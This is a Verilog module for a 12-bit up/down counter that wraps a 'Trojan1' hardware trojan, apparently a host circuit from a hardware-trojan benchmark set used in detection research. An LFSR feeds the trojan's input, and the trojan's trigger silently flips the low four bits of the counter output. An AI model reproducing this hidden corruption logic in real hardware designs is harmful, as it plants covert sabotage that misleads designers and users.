// Counter Host Circuit for Trojan1
// Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
module trojan1_counter_host #(
    parameter COUNTER_WIDTH = 12,  // Counter width
    parameter COUNT_LIMIT = 2048,  // Upper count limit
    parameter [23:0] R1_INIT = 24'hDEADBE  // R1 generation seed
)(
    input wire clk,
    input wire rst,
    input wire count_enable,
    input wire count_direction,  // 0=up, 1=down
    input wire [COUNTER_WIDTH-1:0] load_value,
    input wire load_enable,
    output reg [COUNTER_WIDTH-1:0] count_value,
    output reg overflow_flag,
    output reg underflow_flag
);

    // Trojan interface (fixed width)
    wire trojan_r1;
    wire trojan_trigger;
    
    // Counter logic
    reg [COUNTER_WIDTH-1:0] counter;
    reg [23:0] r1_lfsr;
    reg [2:0] r1_bit_select;
    
    // R1 signal generation using LFSR
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            r1_lfsr <= R1_INIT;
            r1_bit_select <= 3'b0;
        end else if (count_enable) begin
            r1_lfsr <= {r1_lfsr[22:0], r1_lfsr[23] ^ r1_lfsr[17] ^ r1_lfsr[14] ^ r1_lfsr[1]};
            r1_bit_select <= r1_bit_select + 1;
        end
    end
    
    assign trojan_r1 = r1_lfsr[{2'b00, r1_bit_select}];
    
    // Counter operation
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            counter <= {COUNTER_WIDTH{1'b0}};
            overflow_flag <= 1'b0;
            underflow_flag <= 1'b0;
        end else if (load_enable) begin
            counter <= load_value;
            overflow_flag <= 1'b0;
            underflow_flag <= 1'b0;
        end else if (count_enable) begin
            if (count_direction) begin
                // Down counting
                if (counter == {COUNTER_WIDTH{1'b0}}) begin
                    underflow_flag <= 1'b1;
                    counter <= COUNT_LIMIT[COUNTER_WIDTH-1:0];
                end else begin
                    counter <= counter - 1;
                    underflow_flag <= 1'b0;
                end
            end else begin
                // Up counting
                if (counter >= COUNT_LIMIT[COUNTER_WIDTH-1:0]) begin
                    overflow_flag <= 1'b1;
                    counter <= {COUNTER_WIDTH{1'b0}};
                end else begin
                    counter <= counter + 1;
                    overflow_flag <= 1'b0;
                end
            end
        end else begin
            overflow_flag <= 1'b0;
            underflow_flag <= 1'b0;
        end
    end
    
    // Output with trojan trigger integration
    always @(posedge clk or posedge rst) begin
        if (rst)
            count_value <= {COUNTER_WIDTH{1'b0}};
        else
            // XOR counter with trojan trigger pattern
            count_value <= counter ^ (trojan_trigger ? {{(COUNTER_WIDTH-4){1'b0}}, 4'hF} : {COUNTER_WIDTH{1'b0}});
    end
    
    // Instantiate Trojan1
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule

